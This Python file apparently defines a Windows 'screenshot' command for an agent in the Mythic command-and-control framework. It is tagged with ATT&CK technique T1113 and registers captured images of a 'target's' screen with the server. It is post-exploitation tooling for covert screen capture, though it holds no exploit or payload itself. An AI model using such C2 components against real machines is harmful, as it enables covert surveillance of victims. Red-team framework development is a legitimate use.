from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

class ScreenshotArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            # Add any arguments if needed, e.g., save path (optional)
        ]

    async def parse_arguments(self):
        # No arguments needed for screenshot
        pass

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)

class ScreenshotCommand(CommandBase):
    cmd = "screenshot"
    needs_admin = False
    help_cmd = "screenshot"
    description = "Take a screenshot of the target's current screen."
    version = 1
    supported_ui_features = ["screenshot:image"]
    author = "@ZZ0R0"
    attackmapping = ["T1113"]
    argument_class = ScreenshotArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        # No additional tasking needed
        return task


    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        # Register the screenshot with Mythic
        await MythicRPC().execute("create_file", task_id=task.Task.ID, file=response, is_screenshot=True)
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp